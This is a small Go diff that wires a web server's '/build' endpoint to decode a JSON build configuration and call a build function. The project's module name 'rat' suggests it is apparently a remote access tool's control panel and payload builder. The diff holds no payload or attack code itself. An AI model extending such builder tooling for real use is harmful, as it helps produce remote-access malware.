@@ -1,9 +1,12 @@
 package main
 
 import (
+	"encoding/json"
+	"fmt"
 	"html/template"
 	"log"
 	"net/http"
+	"rat/command/build"
 	"rat/common"
 )
 
@@ -45,7 +48,15 @@ func main() {
 		}
 	})
 	http.HandleFunc("/build", func(w http.ResponseWriter, r *http.Request) {
-		w.Write([]byte("Built"))
+		decoder := json.NewDecoder(r.Body)
+		var config build.BuildConfig
+		decoder.Decode(&config)
+		err := build.Build(&config, w)
+
+		if err != nil {
+			fmt.Println("build:", err.Error())
+			w.Write([]byte(err.Error()))
+		}
 	})
 	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./web/static"))))
 	http.Handle("/scripts/", http.StripPrefix("/scripts/", http.FileServer(http.Dir("./web/scripts"))))
